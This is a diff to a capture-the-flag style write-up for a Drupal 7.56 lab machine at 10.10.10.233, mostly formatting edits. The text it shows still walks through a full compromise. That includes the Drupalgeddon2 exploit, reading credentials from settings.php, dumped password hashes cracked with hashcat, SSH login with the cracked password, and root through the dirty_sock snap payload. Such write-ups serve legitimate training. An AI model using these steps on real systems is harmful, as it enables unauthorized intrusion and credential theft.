@@ -56,17 +56,13 @@ garland http://10.10.10.233/themes/garland/
 Default changelog file - http://10.10.10.233/CHANGELOG.txt
 ```
 
+---
+
+## Exploitation
 
 - `searchsploit drupal 7.56` 
 - [Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution](https://www.exploit-db.com/exploits/44449) 
 - If you get an error like: cannot load such file - highline/import (LoadError), you just need to install `highline` with `sudo gem install highline` to install the missing dependency. 
-
-
-
-
-
-
-
 - I didn't know if any configuration files stored usernames and passwords on Drupal so I googled that and found out `sites/default/settings.php` was the file I should take a loot at. 
 - `cat sites/default/settings.php` 
 
@@ -117,7 +113,7 @@ fucker => $S$DDSgB/GK6gUnA/XspYNYKNGy8y0Mgkd6fzAqvgI8K.O66QTLtoC0
 ```
 
 - Lets copy them all to `crack.txt` and attempt to crack them with `hashcat`. 
-- `hashid crack.txt -m` => 7900
+- `hashid crack.txt -m` <span class="fat-arrow">=></span> 7900
 
 ```
 hashcat -m 7900 -w 3 crack.txt /usr/share/wordlists/rockyou.txt -O
@@ -125,12 +121,11 @@ hashcat -m 7900 -w 3 crack.txt /usr/share/wordlists/rockyou.txt -O
 
 ```
 $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
-
 brucetherealadmin:booboo
 ```
 
 - The credentials work not only on the website but also on SSH! 
-- `ssh brucetherealadmin@10.10.10.233` => `booboo` 
+- `ssh brucetherealadmin@10.10.10.233` <span class="fat-arrow">=></span> `booboo` 
 - `cd /home/brucetherealadmin && ls` 
 - `cat user.txt` 
 
@@ -158,7 +153,7 @@ python -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAA
 - `chmod +x payload.snap` 
 - `sudo snap install payload.snap --dangerous --devmode` 
 - This will create a user `dirty_sock:dirty_sock` with root privileges. 
-- `su dirty_sock` => `dirty_sock` 
+- `su dirty_sock` <span class="fat-arrow">=></span> `dirty_sock` 
 - `cat /root/root.txt` 
 
 ```
